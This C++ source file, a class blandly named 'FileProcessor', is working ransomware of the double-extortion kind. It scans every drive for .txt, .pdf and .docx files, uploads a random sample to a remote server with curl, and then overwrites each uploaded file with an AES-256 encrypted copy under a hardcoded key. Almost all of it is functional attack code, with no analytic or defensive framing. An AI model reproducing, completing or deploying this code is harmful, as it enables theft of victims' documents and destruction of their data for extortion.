#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <random>
#include <fstream>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <thread>
#include <atomic>

class FileProcessor {
public:
    // Get all available drives on the system
    static std::vector<std::string> getAllDrives() {
        std::vector<std::string> drives;

#ifdef _WIN32
        // Windows drive discovery (A to Z)
        char drive[4] = "C:\\";
        for (drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) {
            if (GetDriveTypeA(drive) > 1) {
                drives.push_back(std::string(drive));
            }
        }
#else
        // Unix-like systems drive paths
        drives = {"/", "/home", "/usr", "/mnt"};
#endif

        return drives;
    }

    // Find files across all drives matching specified extensions
    static std::vector<std::string> findFilesAcrossSystem(
        const std::vector<std::string>& extensions,
        bool excludeSystemDirs = true) {
        std::vector<std::string> allMatchedFiles;
        std::vector<std::string> drives = getAllDrives();

        // Create threads for each drive to search files in parallel
        std::vector<std::thread> threads;
        std::atomic<int> totalFilesProcessed{0};

        for (const auto& rootPath : drives) {
            threads.push_back(std::thread([rootPath, &allMatchedFiles, &totalFilesProcessed, &extensions, excludeSystemDirs]() {
                try {
                    // Recursively search each drive for matching files
                    auto driveFiles = findFilesByExtension(rootPath, extensions, excludeSystemDirs);
                    allMatchedFiles.insert(allMatchedFiles.end(), driveFiles.begin(), driveFiles.end());
                    totalFilesProcessed += driveFiles.size();
                } catch (const std::exception& e) {
                    std::cerr << "Error searching drive " << rootPath << ": " << e.what() << std::endl;
                }
            }));
        }

        // Wait for all threads to finish
        for (auto& th : threads) {
            th.join();
        }

        std::cout << "Total files processed: " << totalFilesProcessed.load() << std::endl;
        return allMatchedFiles;
    }

    // Encrypt a file in place
    static bool encryptFileInPlace(const std::string& filePath, const std::string& key, const std::string& iv) {
        if (!std::filesystem::exists(filePath)) {
            std::cerr << "File does not exist: " << filePath << std::endl;
            return false;
        }

        // Open the file in binary mode and read its contents
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile.is_open()) {
            std::cerr << "Failed to open file: " << filePath << std::endl;
            return false;
        }

        std::string fileContent((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
        inFile.close();

        // Buffer to hold encrypted content
        std::vector<unsigned char> encryptedContent(fileContent.size() + AES_BLOCK_SIZE);
        int encryptedLen = 0, finalLen = 0;

        // Create encryption context
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) {
            std::cerr << "Failed to create encryption context" << std::endl;
            return false;
        }

        // Initialize encryption with AES-256-CBC mode
        if (!EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL,
                                reinterpret_cast<const unsigned char*>(key.c_str()), reinterpret_cast<const unsigned char*>(iv.c_str()))) {
            std::cerr << "Failed to initialize encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        // Encrypt the file content
        if (!EVP_EncryptUpdate(ctx, encryptedContent.data(), &encryptedLen,
                               reinterpret_cast<const unsigned char*>(fileContent.data()), fileContent.size())) {
            std::cerr << "Encryption failed" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        // Finalize encryption (ensures padding is correct)
        if (!EVP_EncryptFinal_ex(ctx, encryptedContent.data() + encryptedLen, &finalLen)) {
            std::cerr << "Failed to finalize encryption" << std::endl;
            EVP_CIPHER_CTX_free(ctx);
            return false;
        }

        EVP_CIPHER_CTX_free(ctx);

        // Overwrite the original file with encrypted content
        std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
        if (!outFile.is_open()) {
            std::cerr << "Failed to open file for writing: " << filePath << std::endl;
            return false;
        }

        outFile.write(reinterpret_cast<char*>(encryptedContent.data()), encryptedLen + finalLen);
        return true;
    }

    // Upload the file to a server
    static bool uploadFile(const std::string& filePath, const std::string& serverUrl) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "Failed to initialize CURL" << std::endl;
            return false;
        }

        struct curl_httppost* formpost = NULL;
        struct curl_httppost* lastptr = NULL;

        // Prepare the file to be uploaded
        curl_formadd(&formpost, &lastptr,
                     CURLFORM_COPYNAME, "file",
                     CURLFORM_FILE, filePath.c_str(),
                     CURLFORM_END);

        curl_easy_setopt(curl, CURLOPT_URL, serverUrl.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        CURLcode res = curl_easy_perform(curl);
        curl_formfree(formpost);
        curl_easy_cleanup(curl);

        return (res == CURLE_OK);
    }

    static void processRandomFiles(const std::vector<std::string>& files, const std::string& key, const std::string& iv, const std::string& serverUrl, int numFiles = 10) {
        int selectCount = std::min(numFiles, static_cast<int>(files.size()));
        std::vector<std::string> selectedFiles;
        std::sample(files.begin(), files.end(), std::back_inserter(selectedFiles), selectCount, std::mt19937{std::random_device{}()});

        for (const auto& file : selectedFiles) {
            if (uploadFile(file, serverUrl)) {
                encryptFileInPlace(file, key, iv);
            }
        }
    }

private:
    static std::vector<std::string> findFilesByExtension(const std::string& rootPath, const std::vector<std::string>& extensions, bool excludeSystemDirs) {
        std::vector<std::string> matchedFiles;
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath, std::filesystem::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file() && std::find(extensions.begin(), extensions.end(), entry.path().extension().string()) != extensions.end()) {
                    matchedFiles.push_back(entry.path().string());
                }
            }
        } catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "Error processing directory " << rootPath << ": " << e.what() << std::endl;
        }

        return matchedFiles;
    }
};

int main() {
    const std::string encryptionKey = "7cbc68e331ca73e35ab687534b237bc83d19ba1e390d5526c1f1cf8687054552";
    const std::string encryptionIV = "9b25b6e270dbc12063a308ca4d7ff6c7";
    const std::string serverUrl = "http://your-server-url.com/upload";

    std::vector<std::string> extensions = {".txt", ".pdf", ".docx"};
    std::vector<std::string> files = FileProcessor::findFilesAcrossSystem(extensions);

    FileProcessor::processRandomFiles(files, encryptionKey, encryptionIV, serverUrl);
    return 0;
}
